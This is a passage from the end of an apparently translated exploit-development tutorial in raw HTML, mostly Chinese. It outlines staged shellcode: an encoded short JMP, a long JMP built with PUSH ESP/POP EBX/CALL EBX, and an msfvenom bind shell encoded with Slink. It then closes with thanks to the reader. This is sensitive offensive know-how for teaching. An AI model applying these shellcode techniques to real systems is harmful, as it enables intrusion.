na lw po mt mu mv bi translated"><strong class="lb iu"> [#2阶段外壳代码] </strong>用50字节编码短JMP ( <code class="fe lx ly lz ma b">\xEB\x80</code>)。</li><li id="c5c6" class="mn mo it lb b lc mw lg mx lk my lo mz ls na lw po mt mu mv bi translated"><strong class="lb iu"> [#3 Stage Shellcode] </strong>编码67字节长JMP ( <code class="fe lx ly lz ma b">PUSH ESP</code> → <code class="fe lx ly lz ma b">POP EBX</code> → <code class="fe lx ly lz ma b">subtract necessary bytes</code> → <code class="fe lx ly lz ma b">CALL EBX</code>)。</li><li id="aa16" class="mn mo it lb b lc mw lg mx lk my lo mz ls na lw po mt mu mv bi translated"><strong class="lb iu"> [#4阶段外壳代码] </strong>编码绑定外壳。使用Slink对<code class="fe lx ly lz ma b">msfvenom</code>绑定外壳进行编码。</li></ol><p id="fb27" class="pw-post-body-paragraph kz la it lb b lc nb le lf lg nc li lj lk nd lm ln lo ne lq lr ls nf lu lv lw im bi translated">希望你也从中学到了一些东西。感谢阅读！</p><figure class="nm nn no np gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi pp"><img src="../Images/9aeb37c94d51e38d26a8604f304c2d41.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*TMK1akokXpyqn9PK.png"/></div></div></figure></div></div>    
</body>
</html>